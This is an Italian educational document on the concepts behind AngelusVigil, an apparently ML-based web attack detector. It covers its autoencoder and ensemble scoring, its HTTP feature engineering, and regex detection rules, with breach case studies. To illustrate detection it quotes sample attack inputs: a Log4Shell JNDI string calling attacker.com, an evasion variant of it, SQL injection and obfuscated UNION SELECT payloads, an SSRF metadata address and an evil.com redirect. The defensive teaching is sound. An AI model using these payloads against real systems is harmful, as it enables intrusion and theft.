# Concetti fondamentali di sicurezza

Questo documento copre i concetti di sicurezza e di machine learning alla base di AngelusVigil. Non sono definizioni da manuale. Vedremo a fondo come ciascun concetto è effettivamente implementato nel codebase e perché le scelte di design contano.

## Anomaly Detection

### Cos'è

L'anomaly detection identifica i punti dati che non si adattano al pattern atteso. Nel contesto del traffico web, "atteso" significa il comportamento normale degli utenti e delle applicazioni legittimi. Tutto ciò che si discosta in modo significativo da quella baseline viene segnalato come potenzialmente malevolo.

Questo è fondamentalmente diverso dal rilevamento basato su firme (come i WAF tradizionali), che confronta le richieste con un database di pattern di attacco noti. Il rilevamento a firme può intercettare solo gli attacchi che già conosce. L'anomaly detection può intercettare attacchi che non ha mai visto prima, purché appaiano diversi dal traffico normale.

### Perché è importante

Nel dicembre 2021 fu divulgata la vulnerabilità Log4Shell (CVE-2021-44228). Nel giro di poche ore, gli attaccanti inviavano richieste contenenti payload `${jndi:ldap://...}` a milioni di server. I vendor di WAF si affannarono a rilasciare aggiornamenti delle regole, ma molte organizzazioni rimasero esposte per giorni prima che le regole fossero disponibili. Un sistema di anomaly detection addestrato sul traffico normale avrebbe segnalato queste richieste immediatamente. La sottostringa `${jndi:` ha un'entropia alta, una distribuzione dei caratteri insolita e non corrisponde a nessun path o pattern di query legittimo.

L'attacco SolarWinds del 2020 (SUNBURST) è un altro esempio. Gli attaccanti usarono richieste HTTP dall'aspetto legittimo per mimetizzarsi nel traffico normale della piattaforma Orion. Ma i tempi delle richieste, i pattern dei path e le impronte comportamentali erano sottilmente diversi dal vero traffico di gestione. Un anomaly detector ben calibrato che monitorasse quei segnali avrebbe potuto lanciare avvisi precoci.

### Come funziona

AngelusVigil usa un **autoencoder** per l'anomaly detection. Il concetto è semplice: addestrare una rete neurale a comprimere e ricostruire il traffico normale. Se una nuova richiesta non può essere ricostruita bene (errore di ricostruzione alto), è probabilmente anomala.

```
Input (35 features) ──► Encoder ──► Bottleneck (6 dims) ──► Decoder ──► Reconstruction (35 features)
                                                                              │
                                                                   Compare with input
                                                                              │
                                                                   MSE = anomaly score
```

L'architettura dell'autoencoder in questo progetto:

```
35 ──► 24 ──► 12 ──► 6 ──► 12 ──► 24 ──► 35
 input              bottleneck              output
```

Il bottleneck costringe la rete ad apprendere una rappresentazione compressa del traffico normale. Le richieste di attacco contengono pattern che l'autoencoder non ha mai visto durante l'addestramento, quindi vengono ricostruite male. L'errore di ricostruzione (errore quadratico medio tra input e output) diventa l'anomaly score.

Durante l'addestramento viene usato solo traffico normale (benigno). Il modello impara a comprimere e ricostruire le richieste legittime. Durante l'inferenza, l'errore di ricostruzione viene confrontato con una soglia calibrata (impostata al 99.5° percentile degli errori del validation set). Le richieste che superano questa soglia vengono segnalate come anomale.

### Attacchi comuni che l'anomaly detection intercetta

1. **Exploit zero-day** - Payload di attacco inediti che non corrispondono a nessuna firma nota. L'esempio di Log4Shell qui sopra è un caso perfetto: la struttura della richiesta è così insolita che l'anomaly detection la segnala anche senza una regola specifica.

2. **Attacchi slow-and-low** - Attaccanti che distribuiscono le richieste nel tempo per eludere i rate limit. Le feature di aggregazione a finestra (path unici, entropia dei metodi, temporizzazione tra le richieste) catturano pattern comportamentali che le regole per singola richiesta non vedono.

3. **DDoS a livello applicativo** - Richieste individualmente valide ma collettivamente anomale. Un utente legittimo non colpisce 200 path unici in 5 minuti con una spaziatura perfettamente uniforme di 100ms tra le richieste. Le feature a finestra per IP mettono in luce questo comportamento.

4. **Credential stuffing** - Richieste POST ripetute verso endpoint di login da un singolo IP o da una botnet distribuita. Le feature per IP come `req_count_1m`, `error_rate_5m` e `unique_paths_5m` costruiscono un profilo comportamentale che intercetta questo attacco anche quando le singole richieste sembrano normali.

### Limiti

L'anomaly detection produce falsi positivi. Un utente legittimo che fa qualcosa di insolito (chiamate API in massa, test automatizzati) farà scattare gli alert. Per questo AngelusVigil usa un approccio ensemble invece di affidarsi al solo autoencoder, e per questo supporta le label di revisione degli analisti per l'active learning.

Inoltre non può dirti *cosa* sia un attacco. L'autoencoder dice "questo è strano" ma non dice "questa è una SQL injection". Questo è ciò che aggiungono il rule engine e il classificatore random forest.

## Ensemble Learning

### Cos'è

L'ensemble learning combina le predizioni di più modelli per prendere una decisione finale. L'idea è che modelli diversi hanno punti di forza e di debolezza diversi. Combinarli produce risultati migliori di qualsiasi modello da solo.

AngelusVigil usa tre modelli con voto pesato:

```
                   ┌──────────────────┐
                   │ Autoencoder (AE) │  Weight: 0.40
                   │ Unsupervised     │  "How weird is this request?"
                   └────────┬─────────┘
                            │
┌──────────┐    ┌───────────┴───────────┐    ┌──────────────┐
│  Feature  │───►│  Ensemble Fusion      │───►│ Final Score  │
│  Vector   │    │  Weighted Average     │    │  [0.0, 1.0]  │
└──────────┘    └───────────┬───────────┘    └──────────────┘
                            │
                   ┌────────┴─────────┐
                   │ Random Forest    │  Weight: 0.40
                   │ Supervised       │  "Is this an attack?"
                   └────────┬─────────┘
                            │
                   ┌────────┴─────────┐
                   │ Isolation Forest │  Weight: 0.20
                   │ Unsupervised     │  "Is this an outlier?"
                   └──────────────────┘
```

### Perché tre modelli?

Ogni modello porta una prospettiva diversa:

**Autoencoder (peso 40%)** - Addestrato solo su traffico normale. Bravo a intercettare qualsiasi cosa appaia "fuori posto" rispetto alla baseline. Recall alta (intercetta la maggior parte degli attacchi) ma può essere rumoroso (segnala anche richieste insolite ma benigne). L'approccio basato sull'errore di ricostruzione significa che non ha bisogno di dati di attacco etichettati per imparare.

**Random Forest (peso 40%)** - Addestrato su dati etichettati (sia campioni normali sia di attacco). Bravo a classificare tipi di attacco noti con alta precisione. Usa l'oversampling SMOTE per gestire il problema dello sbilanciamento delle classi (gli attacchi sono rari rispetto al traffico normale). Non può intercettare tipi di attacco su cui non è stato addestrato.

**Isolation Forest (peso 20%)** - Un altro approccio non supervisionato che isola le anomalie tramite partizionamento casuale. Le anomalie richiedono meno split per essere isolate perché si trovano in regioni sparse dello spazio delle feature. Ha un peso minore perché si sovrappone in parte alla capacità di anomaly detection dell'autoencoder, ma usa un algoritmo fondamentalmente diverso (basato su alberi contro rete neurale).

### Perché è importante

Nel 2014 JPMorgan Chase fu violata tramite un web server compromesso. Il loro IDS segnalò l'accesso iniziale, ma l'alert di un singolo modello fu classificato come falso positivo e ignorato. Gli attaccanti mantennero l'accesso per due mesi, compromettendo infine 76 milioni di record di famiglie. I sistemi ensemble rendono meno probabile questo tipo di fallimento del singolo modello, perché più modelli indipendenti dovrebbero concordare che il traffico è benigno.

### Come vengono combinati i punteggi

La fusione dell'ensemble avviene in due fasi. Per prima cosa, i punteggi grezzi dei modelli vengono normalizzati in [0, 1]:

```python
def normalize_ae_score(error: float, threshold: float) -> float:
    if threshold <= 0:
        return 0.0
    return min(error / (threshold * 2), 1.0)

def normalize_if_score(raw_score: float) -> float:
    return (1 - raw_score) / 2.0
```

Il punteggio dell'autoencoder è normalizzato rispetto a 2x la soglia calibrata. Il punteggio dell'isolation forest è invertito (sklearn restituisce valori negativi per le anomalie, positivi per il normale) e scalato.

Poi i punteggi normalizzati vengono fusi con una media pesata:

```python
def fuse_scores(scores: dict[str, float], weights: dict[str, float]) -> float:
    total = 0.0
    weight_sum = 0.0
    for key, weight in weights.items():
        if key in scores:
            total += scores[key] * weight
            weight_sum += weight
    if weight_sum == 0:
        return 0.0
    return total / weight_sum
```

La funzione di fusione gestisce con eleganza i modelli mancanti. Se sono caricati solo l'autoencoder e il random forest, il peso dell'isolation forest viene escluso e i pesi rimanenti vengono rinormalizzati. Questo supporta la disponibilità parziale dei modelli durante il retraining.

Infine, il punteggio dell'ensemble ML viene miscelato con il punteggio del rule engine:

```python
def blend_scores(ml_score: float, rule_score: float, ml_weight: float = 0.7) -> float:
    return min(ml_score * ml_weight + rule_score * (1.0 - ml_weight), 1.0)
```

L'ML ha il 70% di influenza, le regole il 30%. Questo significa che una corrispondenza di regola ad alta confidenza (come un pattern Log4Shell) contribuisce comunque in modo significativo al punteggio finale anche se i modelli ML sono incerti.

### Classificazione della severity

Il punteggio miscelato viene mappato su tre livelli di severity:

| Intervallo di punteggio | Severity | Azione |
|---|---|---|
| 0.70 - 1.00 | HIGH | Store + publish alert + WebSocket broadcast |
| 0.50 - 0.69 | MEDIUM | Store + publish alert |
| 0.00 - 0.49 | LOW | Solo log |

## Feature Engineering per il traffico HTTP

### Cos'è

Il feature engineering trasforma i dati grezzi (righe di log nginx) in vettori numerici che i modelli ML possono elaborare. La qualità delle tue feature determina il tetto delle prestazioni del tuo modello. Puoi sempre migliorare l'architettura di un modello, ma non puoi superare feature scadenti.

### Perché è importante

Una riga di log nginx grezza ha questo aspetto:

```
192.168.1.100 - - [15/Mar/2026:14:22:31 +0000] "GET /api/users?id=1' OR '1'='1 HTTP/1.1" 200 1234 "-" "sqlmap/1.5"
```

Un umano nota subito il payload di SQL injection e lo user agent di sqlmap. Ma un modello ML ha bisogno di numeri. Il feature engineering è il ponte tra "testo che un umano può leggere" e "numeri da cui un modello può imparare".

### Il vettore di feature a 35 dimensioni

AngelusVigil estrae due tipi di feature che vengono concatenate in un unico vettore a 35 dimensioni:

**23 feature per richiesta** (stateless, calcolate da una singola entry di log):

| Feature | Tipo | Cosa cattura |
|---|---|---|
| `http_method` | categorical | GET, POST, PUT, DELETE, ecc. |
| `path_depth` | numeric | Numero di segmenti `/` (i path più profondi sono insoliti) |
| `path_entropy` | numeric | Entropia di Shannon della stringa del path (i payload di attacco hanno alta entropia) |
| `path_length` | numeric | Numero grezzo di caratteri |
| `query_string_length` | numeric | Le query string lunghe spesso trasportano payload di injection |
| `query_param_count` | numeric | Numero di parametri separati da `&` |
| `has_encoded_chars` | boolean | Caratteri URL-encoded come `%27` (apice singolo) |
| `has_double_encoding` | boolean | Caratteri a doppia codifica come `%2527` (tecnica di evasione) |
| `status_code` | numeric | Codice di risposta HTTP |
| `status_class` | categorical | Raggruppamento 2xx, 3xx, 4xx, 5xx |
| `response_size` | numeric | Dimensione del body in byte |
| `hour_of_day` | numeric | 0-23, cattura i pattern legati all'ora del giorno |
| `day_of_week` | numeric | 0-6, cattura i pattern settimanali |
| `is_weekend` | boolean | Weekend contro giorno feriale |
| `ua_length` | numeric | Lunghezza della stringa User-Agent |
| `ua_entropy` | numeric | Entropia di Shannon della stringa UA |
| `is_known_bot` | boolean | Corrisponde a firme di bot noti (Googlebot, ecc.) |
| `is_known_scanner` | boolean | Corrisponde a firme di scanner (sqlmap, nikto, ecc.) |
| `has_attack_pattern` | boolean | Corrisponde alla regex combinata di attacco |
| `special_char_ratio` | numeric | Rapporto di caratteri non alfanumerici nel path |
| `file_extension` | categorical | `.php`, `.asp`, `.env`, ecc. |
| `country_code` | categorical | Codice paese GeoIP |
| `is_private_ip` | boolean | Indirizzo privato RFC 1918 |

**12 feature a finestra per IP** (stateful, calcolate da sorted set di Redis):

| Feature | Finestra | Cosa cattura |
|---|---|---|
| `req_count_1m` | 1 min | Frequenza di richieste immediata (burst detection) |
| `req_count_5m` | 5 min | Frequenza sostenuta a breve termine |
| `req_count_10m` | 10 min | Pattern a medio termine |
| `error_rate_5m` | 5 min | Rapporto di risposte 4xx/5xx (gli scanner generano molti errori) |
| `unique_paths_5m` | 5 min | Diversità dei path (gli scanner enumerano molti path) |
| `unique_uas_10m` | 10 min | Diversità degli User-Agent (ruotare gli UA è un'impronta da bot) |
| `method_entropy_5m` | 5 min | Entropia di Shannon dei metodi HTTP usati |
| `avg_response_size_5m` | 5 min | Dimensione media del body di risposta |
| `status_diversity_5m` | 5 min | Conteggio dei codici di stato distinti |
| `path_depth_variance_5m` | 5 min | Varianza nella profondità dei path |
| `inter_request_time_mean` | 10 min | Tempo medio tra le richieste in ms |
| `inter_request_time_std` | 10 min | Deviazione standard degli intervalli tra richieste |

### Entropia di Shannon

L'entropia di Shannon misura la casualità di una stringa. La formula:

```
H(s) = -Σ (count(c) / len(s)) * log2(count(c) / len(s))
```

I path normali come `/api/v1/users` hanno bassa entropia perché i caratteri si ripetono e seguono pattern prevedibili. I payload di attacco come `/api/search?q=%27%20UNION%20SELECT%20*%20FROM%20users--` hanno alta entropia perché contengono un'ampia varietà di caratteri.

L'implementazione nel codebase:

```python
def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    length = len(s)
    counts = Counter(s)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())
```

Viene applicata sia al path della richiesta sia alla stringa User-Agent. Gli User-Agent legittimi come `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` hanno intervalli di entropia prevedibili. Tool scanner come `sqlmap/1.5.2#stable` o gli UA randomizzati usati dalle botnet tendono a cadere fuori da quegli intervalli.

### Perché le feature a finestra hanno bisogno di Redis

Le feature per richiesta sono stateless. Puoi calcolarle da una singola riga di log. Ma il rilevamento comportamentale richiede contesto: "Questo IP sta inviando richieste più velocemente del solito? Ha colpito un numero insolito di path distinti?"

AngelusVigil memorizza la cronologia delle richieste per IP in sorted set di Redis, con il timestamp Unix come score. Questo rende efficienti le query a finestra:

```
ZADD ip:192.168.1.100:requests <timestamp> <request_id>
ZCOUNT ip:192.168.1.100:requests <5m_ago> +inf
```

L'operazione `ZCOUNT` restituisce quante richieste da questo IP sono cadute negli ultimi 5 minuti, calcolate in tempo O(log N). Sette sorted set per IP tracciano dimensioni diverse (richieste, path, status, user agent, dimensioni, metodi, profondità), e tutte le scritture + letture avvengono in un singolo round-trip in pipeline per minimizzare la latenza.

Le chiavi scadono automaticamente dopo 15 minuti (`KEY_TTL = 900`), quindi l'uso di memoria di Redis resta limitato anche sotto traffico intenso.

## Rilevamento basato su regole (Cold-Start)

### Cos'è

Il rilevamento basato su regole usa pattern scritti a mano per identificare tipi di attacco noti. Il rule engine di AngelusVigil è ispirato al ModSecurity Core Rule Set (CRS), il ruleset WAF open source usato da OWASP.

### Perché è importante

I modelli ML hanno bisogno di dati di training. Il primo giorno non hai né dati né modelli. Il rule engine fornisce protezione immediata senza alcun training, coprendo le categorie di attacco web più comuni.

Anche dopo che i modelli ML sono stati addestrati, le regole restano preziose. Intercettano attacchi ben noti con alta confidenza e forniscono spiegabilità ("questa richiesta corrisponde al pattern di SQL injection") che i soli punteggi ML non possono dare.

### Regole sui pattern di attacco

Il rule engine valuta 9 pattern basati su regex rispetto all'URI di ogni richiesta:

| Regola | Punteggio | Cosa intercetta |
|---|---|---|
| LOG4SHELL | 0.95 | `${jndi:ldap://...}` e variazioni (CVE-2021-44228) |
| COMMAND_INJECTION | 0.90 | Metacaratteri shell, esecuzione con backtick, catene di pipe |
| SQL_INJECTION | 0.85 | `UNION SELECT`, `OR 1=1`, sequenze di commento, `SLEEP()` |
| XSS | 0.80 | `<script>`, `javascript:`, event handler (`onerror=`) |
| FILE_INCLUSION | 0.75 | wrapper `php://filter`, `data://`, `expect://` |
| SSRF | 0.70 | Range di IP interni (`169.254.169.254`), endpoint di metadata cloud |
| CRLF_INJECTION | 0.65 | Sequenze `%0d%0a` per l'header injection |
| PATH_TRAVERSAL | 0.60 | `../`, `..%2f`, sequenze di traversal codificate |
| OPEN_REDIRECT | 0.55 | `//evil.com`, manipolazione di URL nei parametri di redirect |

### Regole a soglia comportamentale

Due regole usano feature a finestra invece del pattern matching:

| Regola | Soglia | Punteggio |
|---|---|---|
| RATE_ANOMALY | > 100 richieste/minuto | 0.30 |
| HIGH_ERROR_RATE | > 50% 4xx/5xx in 5 minuti | 0.25 |

### Logica di scoring

Quando più regole corrispondono, il punteggio finale non è semplicemente il massimo. È il punteggio individuale più alto più un boost di 0.05 per ogni regola aggiuntiva che corrisponde, con tetto a 1.0:

```python
scores = sorted([s for _, s in matched], reverse=True)
threat_score = min(
    scores[0] + _BOOST_PER_ADDITIONAL_RULE * (len(scores) - 1),
    1.0,
)
```

Questo significa che una richiesta che corrisponde sia a SQL injection (0.85) sia a double-encoding (0.40) ottiene 0.90, non 0.85. Il boost cattura l'intuizione che gli attacchi multi-tecnica sono più sospetti delle corrispondenze a pattern singolo.

### Errori comuni

**Errore: affidarsi solo ai pattern regex per il rilevamento della SQL injection**

```
# This regex catches basic injection
r"UNION\s+SELECT"

# But misses obfuscated variants
# UNI/**/ON SEL/**/ECT
# 0x554e494f4e2053454c454354 (hex-encoded)
```

Per questo il rule engine è stratificato con il rilevamento del double-encoding e combinato con l'ML. L'autoencoder intercetta le varianti offuscate perché l'alta entropia e la distribuzione insolita dei caratteri dei payload codificati divergono comunque dai pattern del traffico normale.

**Errore: impostare punteggi di regola troppo alti**

Dare a ogni regola un punteggio di 0.90+ rende inutile il sistema di severity. AngelusVigil calibra i punteggi in modo che solo i pattern più pericolosi (Log4Shell, command injection) superino 0.90. Le corrispondenze a minore confidenza come l'open redirect (0.55) riflettono in modo appropriato che questi pattern hanno tassi di falsi positivi più alti.

## Come si relazionano questi concetti

```
Raw Log Line
    │
    ▼
Feature Engineering (35-dim vector)
    │
    ├──────────────────────┐
    ▼                      ▼
Rule Engine            ML Ensemble
(pattern + threshold)  (AE + RF + IF)
    │                      │
    └──────┬───────────────┘
           ▼
    Score Blending (0.3 rules + 0.7 ML)
           │
           ▼
    Severity Classification
    (HIGH / MEDIUM / LOW)
           │
           ▼
    Alert Dispatch
    (store + WebSocket + log)
```

Il feature engineering alimenta entrambi i percorsi di rilevamento. Il rule engine usa le feature grezze (path, query string, user agent) e gli aggregati a finestra (frequenza di richieste, tasso di errore). L'ensemble ML usa il vettore float codificato a 35 dimensioni. Entrambi i percorsi producono punteggi in [0, 1] che vengono miscelati per la decisione finale.

Il ciclo di active learning chiude il cerchio: gli analisti rivedono gli alert, li etichettano come veri/falsi positivi, e quelle label diventano dati di training per il successivo ciclo di addestramento dei modelli ML.

## Standard e framework di settore

### OWASP Top 10

Questo progetto rileva attacchi della maggior parte della OWASP Top 10 (2021):

- **A03:2021 Injection** - I pattern di SQL injection, command injection e LDAP injection sono corrisposti direttamente dal rule engine e catturati dai modelli ML tramite il feature engineering (alta entropia, caratteri codificati, flag dei pattern di attacco)
- **A07:2021 Identification and Authentication Failures** - Rilevamento del credential stuffing tramite frequenze di richieste e tassi di errore a finestra contro gli endpoint di login
- **A10:2021 Server-Side Request Forgery (SSRF)** - Il rule engine intercetta range di IP interni e endpoint di metadata cloud come `169.254.169.254`
- **A01:2021 Broken Access Control** - Rilevamento del path traversal sia tramite regole (pattern `../`) sia tramite feature (profondità del path insolita, alto rapporto di caratteri speciali)

### MITRE ATT&CK

Tecniche rilevanti che questo progetto rileva o monitora:

- **T1190 - Exploit Public-Facing Application** - Il threat model primario. Tutti i pattern delle regole e il rilevamento ML puntano allo sfruttamento dei servizi esposti sul web
- **T1595 - Active Scanning** - Rilevamento degli scanner tramite firme User-Agent (nikto, sqlmap, nmap) e impronte comportamentali (alto numero di path unici, intervalli uniformi tra richieste)
- **T1110 - Brute Force** - Il rilevamento di anomalie di frequenza e il monitoraggio del tasso di errore intercettano i tentativi di brute force delle credenziali
- **T1071.001 - Application Layer Protocol: Web Protocols** - L'intero sistema monitora i pattern del traffico HTTP alla ricerca di comunicazioni anomale

### CWE

Enumerazioni di weakness comuni a cui mira il rule engine:

- **CWE-89** - SQL Injection
- **CWE-79** - Cross-site Scripting (XSS)
- **CWE-78** - OS Command Injection
- **CWE-22** - Path Traversal
- **CWE-918** - Server-Side Request Forgery (SSRF)
- **CWE-113** - HTTP Response Splitting (CRLF Injection)
- **CWE-601** - Open Redirect
- **CWE-917** - Expression Language Injection (Log4Shell)

## Esempi dal mondo reale

### Caso di studio 1: la pandemia di Log4Shell (2021)

Il 9 dicembre 2021 fu resa pubblica una vulnerabilità critica in Apache Log4j (CVE-2021-44228). La vulnerabilità permetteva l'esecuzione di codice remoto tramite lookup JNDI incorporati nei messaggi di log. Gli attaccanti potevano attivarla iniettando `${jndi:ldap://attacker.com/exploit}` in qualsiasi campo che venisse loggato, inclusi header HTTP, parametri di path e stringhe User-Agent.

Entro 72 ore fu rilevato scanning di massa su tutta internet. Cloudflare riferì di aver bloccato 1,3 milioni di tentativi di exploit Log4Shell all'ora al picco. I vendor di WAF rilasciarono regole, ma le organizzazioni che eseguivano software senza patch e senza WAF erano completamente esposte.

L'approccio di AngelusVigil l'avrebbe intercettato in più modi:
- Il rule engine ha un pattern LOG4SHELL dedicato (punteggio 0.95) che corrisponde a `${jndi:` e a comuni varianti di evasione come `${${lower:j}ndi:}`
- L'autoencoder segnalerebbe l'entropia insolita e la distribuzione dei caratteri delle stringhe JNDI anche senza una regola specifica
- Le feature a finestra per IP rileverebbero il comportamento di scanning: centinaia di path unici sondati in rapida successione dalla stessa sorgente

### Caso di studio 2: la violazione di Capital One (2019)

Nel 2019 un'ex dipendente AWS sfruttò un WAF mal configurato sull'infrastruttura AWS di Capital One per eseguire attacchi SSRF contro il servizio di metadata EC2 su `169.254.169.254`. Recuperò credenziali IAM e le usò per esfiltrare dati da bucket S3 contenenti 100 milioni di richieste di credito.

L'attacco comportava richieste HTTP verso indirizzi IP interni tramite l'applicazione web esposta pubblicamente. Il rule engine di AngelusVigil intercetta specificamente le richieste verso `169.254.169.254` e altri range di IP interni (regola SSRF, punteggio 0.70). Il feature extractor segnala inoltre le richieste verso indirizzi IP privati tramite la feature `is_private_ip`.

### Caso di studio 3: la violazione di Equifax tramite Apache Struts (2017)

La violazione di Equifax espose 147 milioni di record tramite CVE-2017-5638, una vulnerabilità di esecuzione di codice remoto in Apache Struts. Gli attaccanti la sfruttarono per mesi prima di essere scoperti. Il payload dell'exploit veniva consegnato nell'header HTTP `Content-Type`, aggirando le regole WAF basate sui path.

Sebbene AngelusVigil monitori i pattern di path e query string invece degli header (analizza gli access log di nginx, non i body completi delle richieste), l'anomaly detection comportamentale avrebbe segnalato l'attività di post-exploitation: path insoliti acceduti, dimensioni di risposta atipiche dovute all'esfiltrazione di dati e pattern di richieste anomali dai tool dell'attaccante.

## Metti alla prova la tua comprensione

Prima di passare all'architettura, assicurati di saper rispondere a:

1. Perché l'autoencoder si addestra solo su traffico normale invece che su un mix di campioni normali e di attacco? Quale vantaggio dà questo per rilevare attacchi inediti?

2. Se dovessi scegliere tra il random forest (supervisionato) e l'isolation forest (non supervisionato) per un deployment in cui non hai alcun dato di attacco etichettato, quale sceglieresti e perché? Cosa perderesti?

3. Il rule engine assegna alla SQL injection un punteggio di 0.85 e al path traversal 0.60. Perché la differenza? Pensa ai tassi di falsi positivi e all'intento dell'attaccante.

4. Perché le feature a finestra (calcolate da Redis) sono importanti per rilevare attacchi che le feature per singola richiesta non vedono? Fai un esempio specifico.

5. I pesi dell'ensemble sono 40/40/20 (AE/RF/IF). Cosa accadrebbe se impostassi il peso dell'autoencoder al 90% e riducessi gli altri al 5% ciascuno?

Se queste domande ti sembrano poco chiare, rileggi le sezioni pertinenti. I documenti di architettura e di implementazione avranno più senso una volta che questi fondamenti saranno chiari.

## Approfondimenti

**Essenziali:**
- [OWASP ModSecurity Core Rule Set](https://coreruleset.org/) - Il ruleset WAF open source che ha ispirato il rule engine di AngelusVigil. Capire le regole CRS ti aiuta a scrivere pattern di detection migliori
- [MITRE ATT&CK for Enterprise](https://attack.mitre.org/matrices/enterprise/) - Il framework per mappare le tecniche di attacco. Essenziale per capire cosa dovrebbe intercettare il tuo sistema di detection
- [Scikit-learn Isolation Forest documentation](https://scikit-learn.org/stable/modules/outlier_detection.html) - Spiegazione chiara di come funzionano gli isolation forest, con dettagli matematici sulla funzione di scoring

**Approfondimenti tecnici:**
- Liu, Ting, and Zhou, "Isolation Forest" (2008) - Il paper originale che introduce gli isolation forest. Spiega perché le anomalie sono più facili da isolare dei punti normali e la base teorica della funzione di scoring
- [Google's Rules of Machine Learning](https://developers.google.com/machine-learning/guides/rules-of-ml) - Lezioni pratiche su quando il ML aiuta e quando no. La regola #1 è "Don't be afraid to launch a product without machine learning," che è esattamente il motivo per cui AngelusVigil parte dalle regole
- Chandola, Banerjee, and Kumar, "Anomaly Detection: A Survey" (2009) - Survey completa delle tecniche di anomaly detection. Utile per capire dove si collocano gli autoencoder nel panorama più ampio

**Contesto storico:**
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html) - L'advisory ufficiale per Log4Shell. Leggere la CVE vera e propria e le versioni interessate ti dà il contesto per la regola di detection
- Krebs on Security, "The Capital One Breach" - Timeline dettagliata dell'attacco SSRF che ha esposto 100M di record. Capire la catena di attacco ti aiuta a vedere perché il rilevamento degli endpoint di metadata è importante
